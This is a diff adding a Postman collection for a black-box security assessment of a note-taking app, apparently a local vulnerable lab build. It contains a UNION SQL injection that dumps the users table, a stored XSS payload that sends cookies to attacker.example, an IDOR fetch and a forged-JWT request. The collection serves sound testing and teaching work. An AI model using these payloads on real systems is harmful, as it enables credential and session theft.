@@ -1,0 +1,109 @@
+{
+  "info": {
+    "name": "NoteVault - Black-Box VAPT Assessment",
+    "description": "Requests used during the black-box assessment of NoteVault, grouped by finding. Set the `base_url` variable to the vulnerable build (default http://localhost:4001) or the remediated build (http://localhost:4002) to compare behavior.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    { "key": "base_url", "value": "http://localhost:4001" }
+  ],
+  "item": [
+    {
+      "name": "00 - Recon",
+      "item": [
+        {
+          "name": "Unauthenticated debug/config probe (VULN-05)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/debug/config"
+          }
+        }
+      ]
+    },
+    {
+      "name": "01 - Auth",
+      "item": [
+        {
+          "name": "Login as alice",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": "{{base_url}}/api/login",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"alice\",\"password\":\"alice123\"}"
+            }
+          }
+        },
+        {
+          "name": "List own notes",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/notes"
+          }
+        }
+      ]
+    },
+    {
+      "name": "02 - VULN-01 SQL Injection (/api/search)",
+      "item": [
+        {
+          "name": "Baseline search",
+          "request": { "method": "GET", "url": "{{base_url}}/api/search?q=Alice" }
+        },
+        {
+          "name": "UNION-based injection - dump users table",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/search?q=%25' UNION SELECT id,password,username FROM users-- "
+          }
+        }
+      ]
+    },
+    {
+      "name": "03 - VULN-02 Stored XSS (comments)",
+      "item": [
+        {
+          "name": "Post XSS payload as comment",
+          "request": {
+            "method": "POST",
+            "header": [{ "key": "Content-Type", "value": "application/json" }],
+            "url": "{{base_url}}/api/notes/1/comments",
+            "body": {
+              "mode": "raw",
+              "raw": "{\"body\":\"<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>\"}"
+            }
+          }
+        },
+        {
+          "name": "Render note page and observe unescaped script",
+          "request": { "method": "GET", "url": "{{base_url}}/notes/1" }
+        }
+      ]
+    },
+    {
+      "name": "04 - VULN-03 IDOR (/api/notes/:id)",
+      "item": [
+        {
+          "name": "Fetch note belonging to another user by guessing id",
+          "request": { "method": "GET", "url": "{{base_url}}/api/notes/3" }
+        }
+      ]
+    },
+    {
+      "name": "05 - VULN-04 Broken Authentication (forged JWT)",
+      "item": [
+        {
+          "name": "Access protected note using a JWT forged with the leaked/weak secret",
+          "request": {
+            "method": "GET",
+            "header": [
+              { "key": "Cookie", "value": "token=<forge with jsonwebtoken using the secret from VULN-05, see report/VAPT_Report.md>" }
+            ],
+            "url": "{{base_url}}/api/notes/3"
+          }
+        }
+      ]
+    }
+  ]
+}
